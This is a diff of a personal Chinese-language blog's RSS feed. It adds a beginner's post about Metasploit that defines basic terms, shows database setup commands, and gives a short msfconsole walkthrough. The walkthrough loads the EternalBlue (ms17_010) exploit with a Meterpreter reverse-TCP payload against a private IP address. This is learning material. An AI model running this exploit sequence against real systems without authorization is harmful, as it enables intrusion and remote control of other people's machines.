@@ -5,16 +5,72 @@
         <link>https://my011215.github.io</link>
         <description>用来记录学习和分享日常</description>
         <language>en</language>
-        <pubDate>Sun, 08 Jan 2023 21:25:30 +0800</pubDate>
-        <lastBuildDate>Sun, 08 Jan 2023 21:25:30 +0800</lastBuildDate>
+        <pubDate>Sun, 08 Jan 2023 23:58:30 +0800</pubDate>
+        <lastBuildDate>Sun, 08 Jan 2023 23:58:30 +0800</lastBuildDate>
         <item>
             <guid isPermalink="true">https://my011215.github.io/2023/01/08/tool/Metasploit/</guid>
             <title>Metasploit</title>
             <link>https://my011215.github.io/2023/01/08/tool/Metasploit/</link>
-            <pubDate>Sun, 08 Jan 2023 21:25:30 +0800</pubDate>
+            <pubDate>Sun, 08 Jan 2023 23:58:30 +0800</pubDate>
             <description><![CDATA[ &lt;!-- toc --&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#%E4%BB%8B%E7%BB%8D&#34;&gt;介绍&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E4%BD%BF%E7%94%A8&#34;&gt;使用&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8&#34;&gt;基本使用&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
 &lt;!-- tocstop --&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt; ]]></description>
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
+&lt;h2&gt;&lt;span id=&#34;介绍&#34;&gt; 介绍&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;Metasploit 是目前世界上领先的渗透测试工具，也是信息安全与渗透测试领域最大的开源项目之一。&lt;br&gt;
+Metasploit 提供两种不同的 UI，msfconsole 和 WebUI，主要使用 msfconsole 接口。因为 msfconsole 对 Metasploit 支持最好，可以使用所有功能。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Metasploit Framework：&lt;br&gt;
+这是一个免费的、开源的渗透测试框架，当前稳定版本是使用 Ruby 语言编写的。它拥有世界上最大的渗透测试攻击数据库，每年超过 100 万次的下载。它也是迄今为止使用 Ruby 构建的最复杂的项目之一。&lt;/li&gt;
+&lt;li&gt;Vulnerability：&lt;br&gt;
+漏洞&lt;/li&gt;
+&lt;li&gt;Exploit：&lt;br&gt;
+攻击代码或程序，它允许攻击者利用易受攻击的系统并危害其安全性。每个漏洞都有对应的漏洞利用程序。Metasploit 有超过 1700 个漏洞利用程序。&lt;/li&gt;
+&lt;li&gt;Payload：&lt;br&gt;
+攻击载荷。&lt;/li&gt;
+&lt;li&gt;Module：&lt;br&gt;
+模块是一个完整的构件，每个模块执行特定的任务，并通过几个模块组成一个单元运行。这种架构的好处是可以很容易的将自己写的利用程序和工具集成到框架中。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;&lt;span id=&#34;使用&#34;&gt; 使用&lt;/span&gt;&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;启动 msfconsole&lt;br&gt;
+ 设置 PostgreSQL 数据库，它将创建数据库用户，创建 msf 和 msf_test 数据库，配置 Metasploit 使用数据库&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;service postgresql start&lt;/li&gt;
+&lt;li&gt;msfdb init&lt;/li&gt;
+&lt;li&gt;msfconsole&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;管理 Metasploit Framework 数据库&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;msfdb&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;修改数据库配置文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;直接编辑 database.yml&lt;br&gt;
+ 文件位于 /usr/share/metasploit-framework/config/database.yml&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;检查数据库连接情况&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;启动 msfconsole，然后执行 db_status&lt;/li&gt;
+&lt;li&gt;db_disconnect ，断开连接&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;&lt;span id=&#34;基本使用&#34;&gt; 基本使用&lt;/span&gt;&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfconsole										    #进入框架&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;search  ms17_010                                    # 使用search命令查找相关漏洞&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/smb/ms17_010_eternalblue        # 使用use进入模块&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;info     										    #使用info查看模块信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/x64/meterpreter/reverse_tcp    	#设置攻击载荷&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show options    									#查看模块需要配置的参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set  RHOST  192.168.100.158    					    #设置参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit / run     								    #攻击&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后渗透阶段											#后渗透阶段&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+ ]]></description>
         </item>
         <item>
             <guid isPermalink="true">https://my011215.github.io/2023/01/08/tool/Nmap/</guid>
